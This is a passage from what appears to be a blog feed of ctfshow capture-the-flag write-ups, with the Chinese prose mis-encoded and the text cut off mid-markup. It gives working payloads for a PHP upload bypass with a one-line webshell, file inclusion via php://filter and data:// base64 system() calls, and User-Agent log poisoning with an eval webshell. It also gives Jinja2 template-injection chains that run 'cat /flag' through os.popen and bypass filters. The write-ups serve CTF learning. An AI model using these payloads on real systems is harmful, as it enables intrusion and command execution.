action&lt;/h1&gt;&#x27;</span>);<br>    &#125;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>]));<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>] == <span class="hljs-string">&#x27;POST&#x27;</span>) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>    <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>    <span class="hljs-variable">$file_tmp</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>    <span class="hljs-variable">$file_size</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;size&#x27;</span>];<br>    <span class="hljs-variable">$file_error</span> = <span class="hljs-variable">$file</span>[<span class="hljs-string">&#x27;error&#x27;</span>];<br>    <br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br>    <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br>    <br>    <span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_error</span> === <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$file_size</span> &lt;= <span class="hljs-number">2097152</span>) &#123;<br>                <span class="hljs-variable">$file_destination</span> = <span class="hljs-string">&#x27;uploads/&#x27;</span> . <span class="hljs-variable">$file_name</span>;<br>    <br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$file_tmp</span>, <span class="hljs-variable">$file_destination</span>)) &#123;<br>                    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>                        <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;ok&#x27;</span>,<br>                        <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;File uploaded successfully&#x27;</span>,<br>                        <span class="hljs-string">&#x27;url&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">preg_split</span>(<span class="hljs-string">&#x27;/\?/&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>])[<span class="hljs-number">0</span>] . <span class="hljs-variable">$file_destination</span><br>                    ));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-keyword">array</span>(<br>            <span class="hljs-string">&#x27;status&#x27;</span> =&gt; <span class="hljs-string">&#x27;error&#x27;</span>,<br>            <span class="hljs-string">&#x27;message&#x27;</span> =&gt; <span class="hljs-string">&#x27;Only zip files are allowed&#x27;</span><br>        ));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åˆ©ç”¨ç‚¹æ˜¯è¿™æ®µï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-variable">$file_name</span>);<br><span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$file_ext</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$allowed</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;zip&#x27;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$allowed</span>)) <br></code></pre></td></tr></table></figure><p>åªæ£€æŸ¥äº†ç¬¬äºŒéƒ¨åˆ†æ˜¯å¦ä¸º<code>zip</code>ï¼Œæ‰€ä»¥æ„é€ ä¸€å¥è¯æœ¨é©¬æ–‡ä»¶åä¸º<code>å•¥éƒ½è¡Œ.zip.php</code>å³å¯ã€‚</p>]]></content>
    
    
    
    <tags>
      
      <tag>åšé¢˜è®°å½•</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>ctfshowåšé¢˜è®°å½•[æœªå®Œæˆ]</title>
    <link href="/2024/03/01/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_SSTI/"/>
    <url>/2024/03/01/%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_SSTI/</url>
    
    <content type="html"><![CDATA[<p>ä¸€äº›åšé¢˜è®°å½•</p><span id="more"></span><hr><h2 id="æ–‡ä»¶åŒ…å«éƒ¨åˆ†ï¼š"><a href="#æ–‡ä»¶åŒ…å«éƒ¨åˆ†ï¼š" class="headerlink" title="æ–‡ä»¶åŒ…å«éƒ¨åˆ†ï¼š"></a>æ–‡ä»¶åŒ…å«éƒ¨åˆ†ï¼š</h2><h2 id="web78"><a href="#web78" class="headerlink" title="web78"></a>web78</h2><p>æ— ä»»ä½•è¿‡æ»¤ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">?file=php:<span class="hljs-regexp">//</span>filter<span class="hljs-regexp">/convert.base64-encode/</span>resource=flag.php<br></code></pre></td></tr></table></figure><h2 id="web79"><a href="#web79" class="headerlink" title="web79"></a>web79</h2><p>è¿‡æ»¤äº†phpï¼Œç›´æ¥è¯»æ–‡ä»¶æ˜¯ä¸è¡Œäº†ï¼Œè€ƒè™‘<code>data</code>ä¼ªåè®®æ‰§è¡Œå‘½ä»¤(base64ç¼–ç )ï¼š</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</span><br><span class="language-xml">//</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;cat flag.php&#x27;</span>);</span><br></code></pre></td></tr></table></figure><p>æˆ–è€…ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-symbol">data:</span>/<span class="hljs-regexp">/text/plain</span>,&lt;<span class="hljs-string">?=</span><span class="hljs-string">`tac f*`</span>;<span class="hljs-string">?&gt;</span><br></code></pre></td></tr></table></figure><p>å°±æ˜¯åˆ©ç”¨<code>php</code>é‡Œçš„çŸ­æ ‡ç­¾ã€‚<code>&lt;?= ?&gt;</code>ç›¸å½“äº<code>&lt;?php echo ?&gt;</code></p><p>å¦å¤–<code>str_replace</code>æ˜¯åŒºåˆ†å¤§å°å†™çš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$file</span> = <span class="hljs-string">&quot;phpPHPpHpPhP&quot;</span>;<br><span class="hljs-variable">$file1</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;----------------&#x27;</span>;<br><span class="hljs-variable">$file2</span> = <span class="hljs-title function_ invoke__">str_ireplace</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;???&quot;</span>, <span class="hljs-variable">$file</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$file2</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//ç»“æœï¼š???PHPpHpPhP----------------????????????</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥è§£æ³•è¿˜æœ‰ï¼š</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?f</span>ile=<span class="hljs-title class_">Php</span><span class="hljs-symbol">://input</span><br><br><span class="hljs-variable constant_">POST</span>æ‰§è¡Œçš„æ•°æ®<br></code></pre></td></tr></table></figure><h2 id="web80"><a href="#web80" class="headerlink" title="web80"></a>web80</h2><p>è¿‡æ»¤äº†<code>data</code>å’Œ<code>php</code>çš„å¤§å°å†™ã€‚ã€‚è¿™é‡Œè¦ç”¨è¿œç¨‹åŒ…å«&#x2F;æ—¥å¿—åŒ…å«ï¼š</p><p><a href="https://drinkflower.asia/wordpress/archives/442">æ—¥å¿—åŒ…å«</a></p><p>ä¸ªäººç†è§£å°±æ˜¯é€šè¿‡<code>include</code>å’Œæ—¥å¿—æ–‡ä»¶ä¸­çš„ç‰¹å®šå†…å®¹é…åˆ(includeæŠŠå•¥ä¸œè¥¿éƒ½å½“phpè¯»)</p><p>æ—¥å¿—æ–‡ä»¶å¸¸è§è·¯å¾„ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/apache/</span>access.log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>access.log<br><span class="hljs-regexp">/var/</span>log<span class="hljs-regexp">/nginx/</span>error.log<br></code></pre></td></tr></table></figure><p>åªæœ‰ç¬¬äºŒä¸ªæœ‰æ­£å¸¸çš„å›æ˜¾ï¼š</p><p><img src="/img/ctfshow80.png" alt="ctfshow80"></p><p>å­˜åœ¨<code>UA</code>å¤´ï¼Œæ‰€ä»¥ç›´æ¥æŠŠ<code>UA</code>å¤´ä¿®æ”¹æˆï¼š</p><p> 1.<code>&lt;?php system(&#39;ls&#39;);?&gt;</code>ï¼Œ<code>&lt;?php system(&#39;cat fl0g.php&#39;);?&gt;</code>ä¼ è¿‡å»å†åˆ·æ–°ä¸‹ç½‘é¡µå°±è¡Œ</p><p>2.<code>&lt;?php @eval($_POST[&#39;a&#39;]); ?&gt;</code> <code>a=system(&#39;cat fl0g.php&#39;);</code></p><h2 id="web81"><a href="#web81" class="headerlink" title="web81"></a>web81</h2><p>æ¯”ä¹‹å‰å¤šäº†ä¸ª<code>:</code>ï¼Œè¿˜æ˜¯ä¸Šä¸€é¢˜çš„æ—¥å¿—åŒ…å«(ä¸»è¦æ˜¯ç¦äº†inputé‚£ä¸ªæ–¹æ³•)ã€‚</p><h2 id="web82"><a href="#web82" class="headerlink" title="web82"></a>web82</h2><h2 id="web88"><a href="#web88" class="headerlink" title="web88"></a>web88</h2><p><code>/i</code>æ¨¡å¼åŒ¹é…çš„å¤§å°å†™ï¼Œ<code>=</code>ä¹Ÿè¢«è¿‡æ»¤äº†ã€‚è¿™é‡Œè¿˜æ˜¯ç”¨<code>79</code>é‚£é‡Œçš„<code>data</code>ä¼ªåè®®æ‰§è¡Œå‘½ä»¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4=  <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&#x27;tac fl0g.php&#x27;</span>); <span class="hljs-meta">?&gt;</span><br>?file=data:<span class="hljs-comment">//text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmwwZy5waHAnKTsgPz4</span><br><span class="hljs-comment">//å› ä¸ºç­‰å·è¢«è¿‡æ»¤äº†æ‰€ä»¥è½¬base64åå†å»æ‰ç­‰å·</span><br></code></pre></td></tr></table></figure><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs"><br></code></pre></td></tr></table></figure><h2 id="SSTIéƒ¨åˆ†ï¼š"><a href="#SSTIéƒ¨åˆ†ï¼š" class="headerlink" title="SSTIéƒ¨åˆ†ï¼š"></a>SSTIéƒ¨åˆ†ï¼š</h2><h2 id="web361"><a href="#web361" class="headerlink" title="web361"></a>web361</h2><p>æ— ä»»ä½•è¿‡æ»¤:</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web362"><a href="#web362" class="headerlink" title="web362"></a>web362</h2><p>åŒä¸Šï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[&#x27;os&#x27;].popen(<span class="hljs-name">&#x27;cat /flag&#x27;</span>).read()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="web363"><a href="#web363" class="headerlink" title="web363"></a>web363</h2><p>åº”è¯¥æ˜¯è¿‡æ»¤äº†å•å¼•å·åŒå¼•å·ï¼š</p><p>å¤´è¦ä¹ˆç”¨<code>config</code>ï¼Œè¦ä¹ˆç”¨<code>()</code>ï¼Œè¿‡æ»¤äº†å¼•å·å¯ä»¥(è¿™ä¸ªå•åŒå¼•å·å¥½åƒæ²¡æ³•ç”¨åå…­è¿›åˆ¶å»è¡¨ç¤º)ï¼š</p><p><img src="/img/ctfshowweb363_1.png" alt="ctfshowweb363_1"></p><p>æŠŠä¹‹å‰<code>payload</code>ä¸­å¸¦å¼•å·çš„éƒ½æ”¾åˆ°<code>request.args.path</code>ä¸­å°±è¡Œï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[request.args.x1].popen(<span class="hljs-name">request.args.x2</span>).read()&#125;&#125;</span><span class="language-xml">&amp;x1=os&amp;x2=cat /flag</span><br></code></pre></td></tr></table></figure><h2 id="web364"><a href="#web364" class="headerlink" title="web364"></a>web364</h2><p>åº”è¯¥æ˜¯åœ¨ä¸Šé¢˜çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†<code>args</code>ï¼Œæœäº†ä¸‹è¿˜å¯ä»¥ç”¨<code>cookieä¼ å€¼</code>ï¼š</p><p><a href="https://blog.csdn.net/miuzzx/article/details/112168039">å‚è€ƒæ–‡ç« </a></p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">payload</span><br><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">x.__init__.__globals__</span>[request.cookies.x1].eval(<span class="hljs-name">request.cookies.x2</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">cookieä¼ å€¼</span><br><span class="language-xml">Cookie:x1=__builtins__;x2=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>è¿™ä¸ªxå½“å¼€å¤´ç¬¬ä¸€æ¬¡è§ï¼š</p><p><img src="/img/ctfshowweb364_1.png" alt="ctfshowweb364_1"></p><p><code>config</code>çš„è¯ç±»ä¸­__init__å‡½æ•°å…¨å±€å˜é‡ä¸­å·²ç»å¯¼å…¥äº†â€osâ€æ¨¡å—ï¼Œå¯ä»¥ç›´æ¥è°ƒç”¨ã€‚</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__</span>[request.cookies.x1].popen(<span class="hljs-name">request.cookies.x2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//hackbarç›´æ¥ä¼ ï¼š</span><br><span class="language-xml">Cookie:  x1=os;x2=cat /flag //Cookieä¸ç”¨åŠ </span><br></code></pre></td></tr></table></figure><h2 id="web365"><a href="#web365" class="headerlink" title="web365"></a>web365</h2><p>åœ¨ä¹‹å‰çš„åŸºç¡€ä¸Šè¿‡æ»¤äº†ä¸­æ‹¬å·ï¼š</p><p><code>__getitem__</code> æ–¹æ³•æ˜¯ Python å¯¹è±¡çš„ä¸€ä¸ªå†…å»ºæ–¹æ³•ï¼Œå½“ä½ ä½¿ç”¨ä¸­æ‹¬å· <code>[]</code> æ¥è®¿é—®å¯¹è±¡çš„å…ƒç´ æ—¶ï¼Œå®é™…ä¸Šæ˜¯è°ƒç”¨äº†è¿™ä¸ªæ–¹æ³•ã€‚</p><p>å¯¹äºå­—å…¸æ¥è¯´ï¼Œä½¿ç”¨ <code>__getitem__</code> æ–¹æ³•ï¼Œä½ å¯ä»¥è¿™æ ·è·å–å­—å…¸ä¸­çš„é”®å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">my_dict = &#123;<span class="hljs-string">&#x27;key1&#x27;</span>: <span class="hljs-string">&#x27;value1&#x27;</span>, <span class="hljs-string">&#x27;key2&#x27;</span>: <span class="hljs-string">&#x27;value2&#x27;</span>&#125;<br>result = my_dict.__getitem__(<span class="hljs-string">&#x27;key1&#x27;</span>)  <span class="hljs-comment"># æˆ–è€…ç›´æ¥å†™ä½œ result = my_dict[&#x27;key1&#x27;]</span><br><span class="hljs-built_in">print</span>(result)<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">config.__class__.__init__.__globals__.__getitem__</span>(<span class="hljs-name">request.cookies.x1</span>).popen(<span class="hljs-name">request.cookies.x2</span>).read()&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml">//hackbarç›´æ¥ä¼ ï¼š</span><br><span class="language-xml">Cookie:  x1=os;x2=cat /flag //Cookieä¸ç”¨åŠ </span><br></code></pre></td></tr></table></figure><h2 id="web366"><a href="#web366" class="headerlink" title="web366"></a>web366</h2><p>è¿‡æ»¤äº†ä¸‹åˆ’çº¿ï¼š</p><p><a href="https://blog.csdn.net/miuzzx/article/details/112168039">å‚è€ƒæ–‡ç« </a></p><p>ä½¿ç”¨ <code>foo|attr(&quot;bar&quot;)</code> å¯ä»¥è·å–å¯¹è±¡ <code>foo</code> çš„å±æ€§ <code>bar</code> çš„å€¼ï¼Œç±»ä¼¼äº <code>foo.bar</code> çš„ç”¨æ³•ã€‚</p><p>æ‰€ä»¥ï¼š</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">?name=</span><span class="hljs-template-variable">&#123;&#123;(<span class="hljs-name">x</span>|attr(<span class="hljs-name">request.cookies.x1</span>)|attr(<span class="hljs-name">request.cookies.x2</span>)|attr(<span class="hljs-name">request.cookies.x3</span>))(<span class="hljs-name">request.cookies.x4</span>).eval(<span class="hljs-name">request.cookies.x5</span>)&#125;&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><br><span class="language-xml">Cookie:x1=__init__;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>ç®€å•è¯´è¿˜æ˜¯åˆ©ç”¨è¯·æ±‚å‚æ•°è¿›è¡Œé€ƒé€¸</p><h2 id="web367"><a href="#web367" class="headerlink" title="web367"></a>web367</h2><p>åŒä¸Š</p><h2 id="web368"><a href="#web368" class="headerlink" title="web368"></a>web368</h2><p>åˆè¿‡æ»¤äº†åŒå¤§æ‹¬å·ï¼Œä½†<code>&#123;%%&#125;</code>è¿™ä¸œè¥¿å¹¶æ²¡æœ‰è¿‡æ»¤ã€‚</p><p><a href="https://blog.csdn.net/weixin_73051164/article/details/132574970">å‚è€ƒæ–‡ç« </a></p><p>ä¸è¿‡æ³¨æ„è¦åŠ ä¸Š<code>print</code>ï¼Œä¸ç„¶åªä¼šæ‰§è¡Œå‘½ä»¤ï¼Œæ²¡å›æ˜¾ã€‚åœ¨ä¸Šä¸€é¢˜åŸºç¡€ä¸Šä¿®æ”¹å°±è¡Œï¼š</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/?name<span class="hljs-operator">=</span>&#123;<span class="hljs-variable">%print</span>((<span class="hljs-keyword">x</span>|attr(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">1</span>)|attr(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">2</span>)|attr(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">3</span>))(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">4</span>).eval(request.cookies.<span class="hljs-keyword">x</span><span class="hljs-number">5</span>))%&#125;<br><br>Cookie:<span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-operator">=</span>__init__<span class="hljs-comment">;x2=__globals__;x3=__getitem__;x4=__builtins__;x5=__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read()</span><br></code></pre></td></tr></table></figure><p>è¿˜æœ‰å…¶å®ƒè§£æ³•(å…¶å®å°±æ˜¯æŠŠä¸Šé¢çš„æ‹†å¼€äº†ï¼š</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">name=&#123;%set aaa=(x|attr(request.cookies.<span class="hljs-keyword">in</span>)|attr(request.cookies.gl)|attr(request.cookies.ge))(request.cookies.bu)%&#125;&#123;% <span class="hljs-keyword">print</span>(aaa.<span class="hljs-keyword">eval</span>(request.cookies.cmd))%&#125;<br><br><span class="hljs-keyword">in</span>=init;gl=globals;ge=getitem;bu=builtins;cmd=import(<span class="hljs-string">&#x27;os&#x27;</span>).<span class="hljs-keyword">popen</span>(<span class="hljs-string">&#x27;cat /f*&#x27;</span>).read()<br></code></pre></td></tr></table></figure><h2 id="web369"><a href="#web369" class="headerlink" title="web369"></a>web369</h2><p>åˆè¿‡æ»¤äº†<code>request</code>ï¼Œç›´æ¥æŠ„äº†yuå¸ˆå‚…çš„ï¼š</p><figure class="highlight twig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs twig"><span class="language-xml">?name=</span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> po=dict(po=a,p=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span><span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> a=(()<span class="hljs-punctuation">|</span>select<span class="hljs-punctuation">|</span>string<span class="hljs-punctuation">|</span>list)<span class="hljs-punctuation">|</span>attr(po)(<span class="hljs-number">24</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> ini=(a,a,dict(init=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> glo=(a,a,dict(globals=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> geti=(a,a,dict(getitem=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> built=(a,a,dict(builtins=a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>,a,a)<span class="hljs-punctuation">|</span><span class="hljs-keyword">join</span>()<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> x=(q<span class="hljs-punctuation">|</span>attr(ini)<span class="hljs-punctuation">|</span>attr(glo)<span class="hljs-punctuation">|</span>attr(geti))(built)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> chr=x.chr<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span> <span class="hljs-name">set</span> file=chr(<span class="hljs-number">47</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">102</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">108</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">97</span>)%<span class="hljs-number">2</span>bchr(<span class="hljs-number">103</span>)<span class="hljs-template-tag">%&#125;</span><span class="language-xml"></span><br><span class="language-xml"></span><span class="hljs-template-tag">&#123;%</span><span class="hljs-name">print</span>(x.open(file).read())<span class="hljs-template-tag">%&#125;</span><br></code></pre></td></tr></table></figure><h2 id="ååºåˆ—åŒ–éƒ¨åˆ†"><a href="#ååºåˆ—åŒ–éƒ¨åˆ†" class="headerlink" title="ååºåˆ—åŒ–éƒ¨åˆ†"></a>ååºåˆ—åŒ–éƒ¨åˆ†</h2><h2 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h2><h2 id="ç»„ä»¶æ¼æ´"><a href="#ç»„ä»¶æ¼æ´" class="headerlink" title="ç»„ä»¶æ¼æ´"></a>ç»„ä»¶æ¼æ´</h2><h2 id="web580"><a href="#web580" class="headerlink" title="web580"></a>web580</h2><h2 id="838"><a href="#838" class="headerlink" title="838"></a>838</h2><p><img src="/img/838_1.png" alt="838_1"></p><p>å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸‹è½½ï¼Œæœ¬æ¥æƒ³è¯»<code>/proc/self/environ</code>çœ‹å½“å‰å·¥ä½œç›®å½•çš„ï¼Œç»“æœç›´æ¥æŠŠflagè¯»äº†ï¼š</p><p><img src="/img/838_2.png" alt="838_2"></p><p>çœ‹<code>web.xml</code>ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span 